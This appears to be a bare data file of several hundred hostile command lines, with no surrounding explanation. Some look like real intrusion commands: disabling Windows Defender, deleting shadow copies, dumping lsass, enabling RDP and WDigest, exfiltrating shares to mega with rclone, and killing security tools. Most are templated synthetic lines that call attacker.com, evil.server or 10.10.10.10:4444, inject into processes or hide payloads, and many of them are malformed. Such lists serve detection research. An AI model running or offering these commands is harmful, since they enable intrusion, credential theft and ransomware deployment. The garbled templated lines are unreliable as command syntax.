+python.exe Stop-Process -Name taskmgr.exe -Force
+python.exe attrib +s +h /tmp/malware.sh
+python.exe attrib +s +h /usr/local/bin/backdoor
+python.exe attrib +s +h /var/tmp/hide.so
+python.exe attrib +s +h C:\Users\Public\runme.bat
+python.exe attrib +s +h C:\Windows\Temp\evil.dll
+python.exe chmod 777 /tmp/malware.sh
+python.exe chmod 777 /usr/local/bin/backdoor
+python.exe chmod 777 C:\Windows\Temp\evil.dll
+python.exe curl -X POST --data 'ping' 10.10.10.10:4444
+python.exe curl -X POST --data 'ping' 192.168.1.100:8080
+python.exe curl -X POST --data 'ping' http://attacker.com/c2
+python.exe curl -X POST --data 'ping' https://evil.server/payload
+python.exe del /tmp/malware.sh
+python.exe del /usr/local/bin/backdoor
+python.exe del /var/tmp/hide.so
+python.exe del C:\ProgramData\updater.exe
+python.exe del C:\Windows\Temp\evil.dll
+python.exe dllinjector.exe -p explorer.exe -d payload.dll
+python.exe dllinjector.exe -p notepad.exe -d payload.dll
+python.exe dllinjector.exe -p winlogon.exe -d payload.dll
+python.exe icacls /var/tmp/hide.so /grant Everyone:F
+python.exe icacls C:\Users\Public\runme.bat /grant Everyone:F
+python.exe kill $(Get-Process explorer.exe.Id)
+python.exe kill $(Get-Process svchost.exe.Id)
+python.exe kill $(Get-Process taskmgr.exe.Id)
+python.exe nc -lvp 4444 -s 192.168.1.100:8080
+python.exe nc -lvp 4444 -s http://attacker.com/c2
+python.exe powershell -c "Invoke-RestMethod -Uri http://attacker.com/c2 -Body 'cmd=whoami'"
+python.exe powershell -c "Invoke-RestMethod -Uri https://evil.server/payload -Body 'cmd=whoami'"
+python.exe powershell Start-Process cmd.exe
+python.exe powershell Start-Process python.exe
+python.exe powershell Start-Process svchost.exe
+python.exe powershell Start-Process wmic.exe
+python.exe python3 -m http.server 8080 --bind 10.10.10.10:4444
+python.exe python3 -m http.server 8080 --bind 192.168.1.100:8080
+python.exe python3 -m http.server 8080 --bind https://evil.server/payload
+python.exe rm /var/tmp/hide.so
+python.exe rm C:\ProgramData\updater.exe
+python.exe rm C:\Users\Public\runme.bat
+python.exe rm C:\Windows\Temp\evil.dll
+python.exe runas /user:admin powershell.exe
+python.exe runas /user:admin python.exe
+python.exe runas /user:admin svchost.exe
+python.exe runas /user:admin wmic.exe
+python.exe socat TCP4-LISTEN:8080,fork 10.10.10.10:4444
+python.exe socat TCP4-LISTEN:8080,fork https://evil.server/payload
+python.exe taskkill /IM explorer.exe /F
+python.exe taskkill /IM lsass.exe /F
+python.exe taskkill /IM notepad.exe /F
+python.exe taskkill /IM svchost.exe /F
+python.exe taskkill /IM taskmgr.exe /F
+python.exe taskkill /IM winlogon.exe /F
+python_17.exe -c "open('C:\\temp\\pw_17.txt').read()"
+python_24.exe -c "open('C:\\Users\\admin\\payload_24.exe', 'wb').write(b'\x90\x90\x90')"
+python_27.exe -c "open('C:\\temp\\pw_27.txt').read()"
+python_30.exe -c "open('C:\\Users\\admin\\payload_30.exe', 'wb').write(b'\x90\x90\x90')"
+python_31.exe -c "open('C:\\Users\\admin\\payload_31.exe', 'wb').write(b'\x90\x90\x90')"
+python_38.exe -c "open('C:\\temp\\pw_38.txt').read()"
+python_39.exe -c "open('C:\\Users\\admin\\payload_39.exe', 'wb').write(b'\x90\x90\x90')"
+python_42.exe -c "open('C:\\Users\\admin\\payload_42.exe', 'wb').write(b'\x90\x90\x90')"
+python_44.exe -c "open('C:\\Users\\admin\\payload_44.exe', 'wb').write(b'\x90\x90\x90')"
+python_54.exe -c "open('C:\\temp\\pw_54.txt').read()"
+python_56.exe -c "open('C:\\Users\\admin\\payload_56.exe', 'wb').write(b'\x90\x90\x90')"
+python_59.exe -c "open('C:\\Users\\admin\\payload_59.exe', 'wb').write(b'\x90\x90\x90')"
+python_77.exe -c "open('C:\\Users\\admin\\payload_77.exe', 'wb').write(b'\x90\x90\x90')"
+python_8.exe -c "open('C:\\temp\\pw_8.txt').read()"
+python_82.exe -c "open('C:\\temp\\pw_82.txt').read()"
+python_86.exe -c "open('C:\\temp\\pw_86.txt').read()"
+qq.exe -gcb -sc trustdmp
+qq.exe -subnets -f (objectCategory=subnet)
+rclone.exe, copy, \\REDACTED\Shares, mega:Shares, -q, --ignore-existing, --auto-confirm, --multi-thread-streams, 4, --transfers, 4
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d 1 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d JapanNight!128 /f
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v *a /t REG_SZ /d "cmd.exe /c C:\<REDACTED-COMPANY-NAME>.exe" /f
+reg add "HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG\_DWORD /d 1 /f
+reg add "HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG\_DWORD /d 0 /f
+reg add "HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP" /v UserAuthentication /t REG\_DWORD /d "0" /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d "0" /f
+reg add "HKLM\SYSTEM\CurrrentControlSet\Control\Terminal Server" /f /v fDenyTSConnections /t REG_DWORD /d 0
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SubmitSamplesConsent" /t REG_DWORD /d "0" /f
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG\_DWORD /d 1 /f
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+reg add HKLM\SYSTEM\CurrrentControlSet\Control\Terminal Server /f /v fDenyTSConnections /t REG_DWORD /d 0
+reg add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList\" /t REG_DWORD /f /d 0 /v Support"
+reg query hkcu\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall /v "DisplayName" /s
+reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+reg_1.exe query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+reg_12.exe query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+reg_14.exe query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+reg_20.exe query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+reg_23.exe query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+reg_32.exe query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+reg_33.exe query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+reg_40.exe query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+reg_5.exe query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+reg_53.exe query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+reg_60.exe query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+reg_65.exe query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+reg_67.exe query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+reg_77.exe query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+reg_83.exe query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+reg_9.exe query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+reg_93.exe query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+regsvr32 /s /n /i:Action "C:\Users\<user>\AppData\Roaming\Microsoft\20350.dll"
+regsvr32 /s /n /i\:Action "C:\Users\<user>\AppData\Roaming\Microsoft\20350.dll"
+regsvr32.exe /s /n /i "C:\ProgramData\31765.ocx"
+rundll32 C:\PerfLogs\socks64.dll, rundll
+rundll32 C:\\PerfLogs\\socks64.dll, rundll
+rundll32.exe  c:\programdata\payload_cr1.dll,DllInstall
+rundll32.exe "C:\Users\USERNAME\AppData\Local\Temp\skull-x64.dat",update /i:"DwarfWing\license.dat"
+rundll32.exe -Command "Start-Process /tmp/malware.sh"
+rundll32.exe -exec /tmp/malware.sh
+rundll32.exe -exec /usr/local/bin/backdoor
+rundll32.exe -exec C:\ProgramData\updater.exe
+rundll32.exe -exec C:\Users\Public\runme.bat
+rundll32.exe /c start /tmp/malware.sh
+rundll32.exe /c start C:\ProgramData\updater.exe
+rundll32.exe /c start C:\Users\Public\runme.bat
+rundll32.exe /c start C:\Windows\Temp\evil.dll
+rundll32.exe /c start powershell.exe
+rundll32.exe /c start python.exe
+rundll32.exe /c start rundll32.exe
+rundll32.exe C:\Users\redacted\AppData\Local\Temp\wsuC3C.tmp,ControlUnitSpeed
+rundll32.exe Invoke-ReflectivePEInjection -PEPath lsass.exe
+rundll32.exe Invoke-ReflectivePEInjection -PEPath svchost.exe
+rundll32.exe Invoke-ReflectivePEInjection -PEPath taskmgr.exe
+rundll32.exe Invoke-ReflectivePEInjection -PEPath winlogon.exe
+rundll32.exe Invoke-WebRequest -Uri 10.10.10.10:4444 -Method POST
+rundll32.exe Invoke-WebRequest -Uri 192.168.1.100:8080 -Method POST
+rundll32.exe Invoke-WebRequest -Uri https://evil.server/payload -Method POST
+rundll32.exe Remove-Item /usr/local/bin/backdoor -Force
+rundll32.exe Remove-Item C:\ProgramData\updater.exe -Force
+rundll32.exe Remove-Item C:\Users\Public\runme.bat -Force
+rundll32.exe Remove-Item C:\Windows\Temp\evil.dll -Force
+rundll32.exe Set-ProcessInjection -Target explorer.exe
+rundll32.exe Set-ProcessInjection -Target notepad.exe
+rundll32.exe Set-ProcessInjection -Target taskmgr.exe
+rundll32.exe Stop-Process -Name explorer.exe -Force
+rundll32.exe Stop-Process -Name notepad.exe -Force
+rundll32.exe Stop-Process -Name svchost.exe -Force
+rundll32.exe Stop-Process -Name taskmgr.exe -Force
+rundll32.exe attrib +s +h /var/tmp/hide.so
+rundll32.exe attrib +s +h C:\ProgramData\updater.exe
+rundll32.exe attrib +s +h C:\Users\Public\runme.bat
+rundll32.exe attrib +s +h C:\Windows\Temp\evil.dll
+rundll32.exe c:\programdata\payload\_cr1.dll,DllInstall
+rundll32.exe chmod 777 /tmp/malware.sh
+rundll32.exe chmod 777 /usr/local/bin/backdoor
+rundll32.exe chmod 777 /var/tmp/hide.so
+rundll32.exe curl -X POST --data 'ping' 10.10.10.10:4444
+rundll32.exe curl -X POST --data 'ping' 192.168.1.100:8080
+rundll32.exe curl -X POST --data 'ping' http://attacker.com/c2
+rundll32.exe curl -X POST --data 'ping' https://evil.server/payload
+rundll32.exe del /tmp/malware.sh
+rundll32.exe del C:\ProgramData\updater.exe
+rundll32.exe del C:\Windows\Temp\evil.dll
+rundll32.exe dllinjector.exe -p explorer.exe -d payload.dll
+rundll32.exe dllinjector.exe -p lsass.exe -d payload.dll
+rundll32.exe dllinjector.exe -p notepad.exe -d payload.dll
+rundll32.exe dllinjector.exe -p taskmgr.exe -d payload.dll
+rundll32.exe dllinjector.exe -p winlogon.exe -d payload.dll
+rundll32.exe icacls /tmp/malware.sh /grant Everyone:F
+rundll32.exe icacls /usr/local/bin/backdoor /grant Everyone:F
+rundll32.exe icacls /var/tmp/hide.so /grant Everyone:F
+rundll32.exe kill $(Get-Process explorer.exe.Id)
+rundll32.exe kill $(Get-Process svchost.exe.Id)
+rundll32.exe kill $(Get-Process taskmgr.exe.Id)
+rundll32.exe kill $(Get-Process winlogon.exe.Id)
+rundll32.exe nc -lvp 4444 -s 10.10.10.10:4444
+rundll32.exe nc -lvp 4444 -s 192.168.1.100:8080
+rundll32.exe nc -lvp 4444 -s http://attacker.com/c2
+rundll32.exe nc -lvp 4444 -s https://evil.server/payload
+rundll32.exe powershell -c "Invoke-RestMethod -Uri 10.10.10.10:4444 -Body 'cmd=whoami'"
+rundll32.exe powershell -c "Invoke-RestMethod -Uri 192.168.1.100:8080 -Body 'cmd=whoami'"
+rundll32.exe powershell -c "Invoke-RestMethod -Uri http://attacker.com/c2 -Body 'cmd=whoami'"
+rundll32.exe powershell -c "Invoke-RestMethod -Uri https://evil.server/payload -Body 'cmd=whoami'"
+rundll32.exe powershell Start-Process cmd.exe
+rundll32.exe powershell Start-Process powershell.exe
+rundll32.exe powershell Start-Process python.exe
+rundll32.exe powershell Start-Process rundll32.exe
+rundll32.exe powershell Start-Process svchost.exe
+rundll32.exe powershell Start-Process wmic.exe
+rundll32.exe python3 -m http.server 8080 --bind 10.10.10.10:4444
+rundll32.exe python3 -m http.server 8080 --bind 192.168.1.100:8080
+rundll32.exe python3 -m http.server 8080 --bind https://evil.server/payload
+rundll32.exe rm /tmp/malware.sh
+rundll32.exe rm C:\Users\Public\runme.bat
+rundll32.exe runas /user:admin cmd.exe
+rundll32.exe runas /user:admin rundll32.exe
+rundll32.exe runas /user:admin svchost.exe
+rundll32.exe runas /user:admin wmic.exe
+rundll32.exe socat TCP4-LISTEN:8080,fork http://attacker.com/c2
+rundll32.exe socat TCP4-LISTEN:8080,fork https://evil.server/payload
+rundll32.exe taskkill /IM explorer.exe /F
+rundll32.exe taskkill /IM lsass.exe /F
+rundll32.exe taskkill /IM notepad.exe /F
+rundll32.exe taskkill /IM taskmgr.exe /F
+rundll32_38.exe shell32.dll,Control_RunDLL C:\Temp\config.ini
+rundll32_43.exe shell32.dll,Control_RunDLL C:\Temp\config.ini
+rundll32_46.exe shell32.dll,Control_RunDLL C:\Temp\config.ini
+rundll32_50.exe shell32.dll,Control_RunDLL C:\Temp\config.ini
+rundll32_78.exe shell32.dll,Control_RunDLL C:\Temp\config.ini
+rundll32_83.exe shell32.dll,Control_RunDLL C:\Temp\config.ini
+rundll32_99.exe shell32.dll,Control_RunDLL C:\Temp\config.iniprocess-file-exec(e1,e2)
+sc config "Netbackup Legacy Network service" start= disabled
+sc config MSExchangeDelivery start= disabled
+sc config MSExchangeDiagnostics start= disabled
+schtasks /Create /TN "8766714F94DD" /XML "C:\ProgramData\Microsoft\51D7701F6EB775C7.txt"
+schtasks /create /F /sc minute /mo 1 /tn "BrowserUpdate" /tr "$dst"
+schtasks /create /tn ngm /tr "%~dps0kit.bat -s" /sc hourly /ru ""
+schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /f
+schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /f
+schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /f
+schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /f
+schtasks.exe /Run /tn '\Microsoft\Windows\Maintenance\Wininet'
+svchost.exe --config svchost.conf --progress --no-check-certificate copy "\\ServerName\C$\ShareName" ftp1:/DomainName/FILES/C/ShareName
+svchost.exe -Command "Start-Process C:\Users\Public\runme.bat"
+svchost.exe -exec /tmp/malware.sh
+svchost.exe -exec /usr/local/bin/backdoor
+svchost.exe -exec /var/tmp/hide.so
+svchost.exe -exec C:\Users\Public\runme.bat
+svchost.exe /c start /usr/local/bin/backdoor
+svchost.exe /c start C:\Windows\Temp\evil.dll
+svchost.exe /c start cmd.exe
+svchost.exe /c start powershell.exe
+svchost.exe /c start python.exe
+svchost.exe /c start rundll32.exe
+svchost.exe /c start svchost.exe
+svchost.exe /c start wmic.exe
+svchost.exe Invoke-ReflectivePEInjection -PEPath explorer.exe
+svchost.exe Invoke-ReflectivePEInjection -PEPath svchost.exe
+svchost.exe Invoke-ReflectivePEInjection -PEPath taskmgr.exe
+svchost.exe Invoke-ReflectivePEInjection -PEPath winlogon.exe
+svchost.exe Invoke-WebRequest -Uri 192.168.1.100:8080 -Method POST
+svchost.exe Invoke-WebRequest -Uri http://attacker.com/c2 -Method POST
+svchost.exe Invoke-WebRequest -Uri https://evil.server/payload -Method POST
+svchost.exe Remove-Item /tmp/malware.sh -Force
+svchost.exe Remove-Item /usr/local/bin/backdoor -Force
+svchost.exe Remove-Item /var/tmp/hide.so -Force
+svchost.exe Remove-Item C:\ProgramData\updater.exe -Force
+svchost.exe Remove-Item C:\Windows\Temp\evil.dll -Force
+svchost.exe Set-ProcessInjection -Target lsass.exe
+svchost.exe Set-ProcessInjection -Target notepad.exe
+svchost.exe Set-ProcessInjection -Target taskmgr.exe
+svchost.exe Set-ProcessInjection -Target winlogon.exe
+svchost.exe Stop-Process -Name lsass.exe -Force
+svchost.exe Stop-Process -Name taskmgr.exe -Force
+svchost.exe Stop-Process -Name winlogon.exe -Force
+svchost.exe attrib +s +h /tmp/malware.sh
+svchost.exe attrib +s +h /usr/local/bin/backdoor
+svchost.exe attrib +s +h /var/tmp/hide.so
+svchost.exe attrib +s +h C:\Windows\Temp\evil.dll
+svchost.exe chmod 777 /tmp/malware.sh
+svchost.exe chmod 777 /usr/local/bin/backdoor
+svchost.exe chmod 777 /var/tmp/hide.so
+svchost.exe chmod 777 C:\ProgramData\updater.exe
+svchost.exe chmod 777 C:\Windows\Temp\evil.dll
+svchost.exe curl -X POST --data 'ping' 10.10.10.10:4444
+svchost.exe curl -X POST --data 'ping' 192.168.1.100:8080
+svchost.exe curl -X POST --data 'ping' http://attacker.com/c2
+svchost.exe curl -X POST --data 'ping' https://evil.server/payload
+svchost.exe del /usr/local/bin/backdoor
+svchost.exe del /var/tmp/hide.so
+svchost.exe del C:\Users\Public\runme.bat
+svchost.exe del C:\Windows\Temp\evil.dll
+svchost.exe dllinjector.exe -p explorer.exe -d payload.dll
+svchost.exe dllinjector.exe -p notepad.exe -d payload.dll
+svchost.exe dllinjector.exe -p svchost.exe -d payload.dll
+svchost.exe dllinjector.exe -p winlogon.exe -d payload.dll
+svchost.exe icacls /tmp/malware.sh /grant Everyone:F
+svchost.exe icacls C:\Users\Public\runme.bat /grant Everyone:F
+svchost.exe icacls C:\Windows\Temp\evil.dll /grant Everyone:F
+svchost.exe kill $(Get-Process lsass.exe.Id)
+svchost.exe kill $(Get-Process taskmgr.exe.Id)
+svchost.exe nc -lvp 4444 -s 10.10.10.10:4444
+svchost.exe nc -lvp 4444 -s 192.168.1.100:8080
+svchost.exe nc -lvp 4444 -s http://attacker.com/c2
+svchost.exe powershell -c "Invoke-RestMethod -Uri 192.168.1.100:8080 -Body 'cmd=whoami'"
+svchost.exe powershell -c "Invoke-RestMethod -Uri http://attacker.com/c2 -Body 'cmd=whoami'"
+svchost.exe powershell Start-Process cmd.exe
+svchost.exe powershell Start-Process powershell.exe
+svchost.exe powershell Start-Process rundll32.exe
+svchost.exe powershell Start-Process wmic.exe
+svchost.exe python3 -m http.server 8080 --bind 10.10.10.10:4444
+svchost.exe python3 -m http.server 8080 --bind 192.168.1.100:8080
+svchost.exe python3 -m http.server 8080 --bind https://evil.server/payload
+svchost.exe rm /usr/local/bin/backdoor
+svchost.exe rm /var/tmp/hide.so
+svchost.exe rm C:\Users\Public\runme.bat
+svchost.exe rm C:\Windows\Temp\evil.dll
+svchost.exe runas /user:admin cmd.exe
+svchost.exe runas /user:admin rundll32.exe
+svchost.exe socat TCP4-LISTEN:8080,fork 10.10.10.10:4444
+svchost.exe socat TCP4-LISTEN:8080,fork 192.168.1.100:8080
+svchost.exe socat TCP4-LISTEN:8080,fork http://attacker.com/c2
+svchost.exe socat TCP4-LISTEN:8080,fork https://evil.server/payload
+svchost.exe taskkill /IM notepad.exe /F
+svchost.exe taskkill /IM svchost.exe /F
+taskkill  /F /IM MSASCuiL.exe
+taskkill  /f /im 360rp.exe
+taskkill  /f /im 360safe.exe
+taskkill  /f /im QQPCMgr.exe
+taskkill  /f /im QQPCTray.exe
+taskkill  /f /im SafeDogGuardCenter.exe
+taskkill  /f /im SafeDogServerUI.exe
+taskkill  /f /im SafeDogSiteIIS.exe
+taskkill  /f /im egui.exe
+taskkill  /f /im ekrn.exe
+taskkill  /f /im net1895.exe
+taskkill -f -im MsDtsSrvr.exe
+taskkill -f -im msmdsrv.exe
+taskkill -f -im sqlbrowser.exe
+taskkill -f -im sqlservr.exe
+taskkill -f -im sqlwriter.exe
+taskkill /f /im 360rp.exe
+taskkill /f /im 360safe.exe
+taskkill /f /im QQPCMgr.exe
+taskkill /f /im QQPCTray.exe
+taskkill /f /im SafeDogGuardCenter.exe
+taskkill /f /im SafeDogServerUI.exe
+taskkill /f /im SafeDogSiteIIS.exe
+taskkill /f /im egui.exe
+taskkill /f /im ekrn.exe
+taskkill /f /im net1895.exe
+typeperf.exe "\System\Processor Queue Length" -si 180 -sc 1
+vssadmin.exe  Delete Shadows /all /quiet
+whoami.exe" /groups
+wmic /node:"192.168.1.2" process call create "C:\Perflogs\434.bat"
+wmic /node:"<redacted>" process call create "cmd /c c:\perflogs\procdump.exe -accepteula -ma lsass c:\perflogs\lsass.dmp"
+wmic /node:"<redacted>" process call create "cmd /c c:\perflogs\procdump.exe" -accepteula -ma lsass c:\perflogs\lsass.dmp
+wmic /node:"<redacted>" process call create "cmd" /c c:\perflogs\procdump.exe -accepteula -ma lsass c:\perflogs\lsass.dmp
+wmic /node:"hostname" process call create "C:\Perflogs\12.bat"
+wmic.exe  Shadowcopy Delete
+wmic.exe -Command "Start-Process /tmp/malware.sh"
+wmic.exe -Command "Start-Process /usr/local/bin/backdoor"
+wmic.exe -Command "Start-Process C:\ProgramData\updater.exe"
+wmic.exe -Command "Start-Process C:\Users\Public\runme.bat"
+wmic.exe -Command "Start-Process C:\Windows\Temp\evil.dll"
+wmic.exe -exec /tmp/malware.sh
+wmic.exe -exec /usr/local/bin/backdoor
+wmic.exe -exec /var/tmp/hide.so
+wmic.exe -exec C:\Users\Public\runme.bat
+wmic.exe -exec C:\Windows\Temp\evil.dll
+wmic.exe /c start /usr/local/bin/backdoor
+wmic.exe /c start /var/tmp/hide.so
+wmic.exe /c start C:\ProgramData\updater.exe
+wmic.exe /c start C:\Windows\Temp\evil.dll
+wmic.exe /c start cmd.exe
+wmic.exe /c start python.exe
+wmic.exe /c start wmic.exe
+wmic.exe Invoke-ReflectivePEInjection -PEPath explorer.exe
+wmic.exe Invoke-ReflectivePEInjection -PEPath lsass.exe
+wmic.exe Invoke-ReflectivePEInjection -PEPath notepad.exe
+wmic.exe Invoke-ReflectivePEInjection -PEPath svchost.exe
+wmic.exe Invoke-ReflectivePEInjection -PEPath taskmgr.exe
+wmic.exe Invoke-WebRequest -Uri 10.10.10.10:4444 -Method POST
+wmic.exe Invoke-WebRequest -Uri http://attacker.com/c2 -Method POST
+wmic.exe Remove-Item C:\ProgramData\updater.exe -Force
+wmic.exe Remove-Item C:\Users\Public\runme.bat -Force
+wmic.exe Remove-Item C:\Windows\Temp\evil.dll -Force
+wmic.exe Set-ProcessInjection -Target lsass.exe
+wmic.exe Set-ProcessInjection -Target svchost.exe
+wmic.exe Stop-Process -Name explorer.exe -Force
+wmic.exe Stop-Process -Name notepad.exe -Force
+wmic.exe Stop-Process -Name svchost.exe -Force
+wmic.exe Stop-Process -Name winlogon.exe -Force
+wmic.exe attrib +s +h /tmp/malware.sh
+wmic.exe attrib +s +h /usr/local/bin/backdoor
+wmic.exe attrib +s +h /var/tmp/hide.so
+wmic.exe attrib +s +h C:\ProgramData\updater.exe
+wmic.exe attrib +s +h C:\Users\Public\runme.bat
+wmic.exe attrib +s +h C:\Windows\Temp\evil.dll
+wmic.exe chmod 777 C:\ProgramData\updater.exe
+wmic.exe chmod 777 C:\Users\Public\runme.bat
+wmic.exe chmod 777 C:\Windows\Temp\evil.dll
+wmic.exe curl -X POST --data 'ping' 192.168.1.100:8080
+wmic.exe curl -X POST --data 'ping' http://attacker.com/c2
+wmic.exe del /tmp/malware.sh
+wmic.exe del /usr/local/bin/backdoor
+wmic.exe dllinjector.exe -p lsass.exe -d payload.dll
+wmic.exe dllinjector.exe -p notepad.exe -d payload.dll
+wmic.exe dllinjector.exe -p svchost.exe -d payload.dll
+wmic.exe icacls /tmp/malware.sh /grant Everyone:F
+wmic.exe icacls /var/tmp/hide.so /grant Everyone:F
+wmic.exe icacls C:\ProgramData\updater.exe /grant Everyone:F
+wmic.exe icacls C:\Users\Public\runme.bat /grant Everyone:F
+wmic.exe icacls C:\Windows\Temp\evil.dll /grant Everyone:F
+wmic.exe kill $(Get-Process lsass.exe.Id)
+wmic.exe kill $(Get-Process notepad.exe.Id)
+wmic.exe nc -lvp 4444 -s 10.10.10.10:4444
+wmic.exe nc -lvp 4444 -s 192.168.1.100:8080
+wmic.exe nc -lvp 4444 -s http://attacker.com/c2
+wmic.exe nc -lvp 4444 -s https://evil.server/payload
+wmic.exe powershell -c "Invoke-RestMethod -Uri 10.10.10.10:4444 -Body 'cmd=whoami'"
+wmic.exe powershell -c "Invoke-RestMethod -Uri 192.168.1.100:8080 -Body 'cmd=whoami'"
+wmic.exe powershell -c "Invoke-RestMethod -Uri http://attacker.com/c2 -Body 'cmd=whoami'"
+wmic.exe powershell -c "Invoke-RestMethod -Uri https://evil.server/payload -Body 'cmd=whoami'"
+wmic.exe powershell Start-Process python.exe
+wmic.exe process call create 'regsvr32 -s C:\Users\Public\microsoft.security'
+wmic.exe python3 -m http.server 8080 --bind 10.10.10.10:4444
+wmic.exe python3 -m http.server 8080 --bind 192.168.1.100:8080
+wmic.exe python3 -m http.server 8080 --bind http://attacker.com/c2
+wmic.exe python3 -m http.server 8080 --bind https://evil.server/payload
+wmic.exe rm /usr/local/bin/backdoor
+wmic.exe rm /var/tmp/hide.so
+wmic.exe rm C:\ProgramData\updater.exe
+wmic.exe rm C:\Windows\Temp\evil.dll
+wmic.exe runas /user:admin cmd.exe
+wmic.exe runas /user:admin powershell.exe
+wmic.exe runas /user:admin rundll32.exe
+wmic.exe runas /user:admin wmic.exe
+wmic.exe socat TCP4-LISTEN:8080,fork 10.10.10.10:4444
+wmic.exe socat TCP4-LISTEN:8080,fork 192.168.1.100:8080
+wmic.exe socat TCP4-LISTEN:8080,fork http://attacker.com/c2
+wmic.exe socat TCP4-LISTEN:8080,fork https://evil.server/payload
+wmic.exe taskkill /IM explorer.exe /F
+wmic.exe taskkill /IM lsass.exe /F
+wmic.exe taskkill /IM svchost.exe /F
+wmic.exe taskkill /IM taskmgr.exe /F
+wmic_4.exe process get commandline < C:\cmd\proc_4.txt
+wmic_48.exe process get commandline < C:\cmd\proc_48.txt
+wmic_6.exe process get commandline < C:\cmd\proc_6.txt
+wmic_90.exe process get commandline < C:\cmd\proc_90.txt
+wmic_92.exe process get commandline < C:\cmd\proc_92.txt
+wmic_97.exe process get commandline < C:\cmd\proc_97.txt
+wscript_0.exe readAll C:\inetpub\wwwroot\web_0.config
+wscript_13.exe readAll C:\inetpub\wwwroot\web_13.config
+wscript_30.exe readAll C:\inetpub\wwwroot\web_30.config
+wscript_47.exe readAll C:\inetpub\wwwroot\web_47.config
+wscript_7.exe readAll C:\inetpub\wwwroot\web_7.config
+wscript_84.exe readAll C:\inetpub\wwwroot\web_84.config
+wscript_88.exe readAll C:\inetpub\wwwroot\web_88.config
